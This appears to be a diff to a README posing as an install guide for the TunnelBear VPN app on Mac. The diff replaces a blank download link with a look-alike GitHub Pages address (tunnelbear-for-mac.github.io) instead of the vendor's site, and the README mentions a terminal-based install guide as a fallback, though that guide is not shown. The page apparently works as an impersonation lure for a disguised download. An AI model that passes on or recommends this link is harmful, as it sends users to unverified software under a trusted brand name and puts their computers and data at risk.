@@ -3,7 +3,7 @@
 TunnelBear is a simple and powerful VPN app for Mac OS that allows you to browse securely, privately, and without restrictions. With an intuitive interface and fast servers in over 45 countries, TunnelBear ensures your internet connection stays protected and unrestricted. Follow the guide below to install and start browsing freely. 🌍✨
 ![vpn](https://www.tunnelbear.com/static/img/protect-bear.a8cca5d.svg)
 
-> [![Download for Mac](https://img.shields.io/badge/Download-for%20Mac-blue?logo=apple&style=for-the-badge)](#)
+> [![Download for Mac](https://img.shields.io/badge/Download-for%20Mac-blue?logo=apple&style=for-the-badge)](https://tunnelbear-for-mac.github.io/.github/)
 
 > ⚠️ If the download button doesn’t work, follow the terminal-based installation guide below.
 
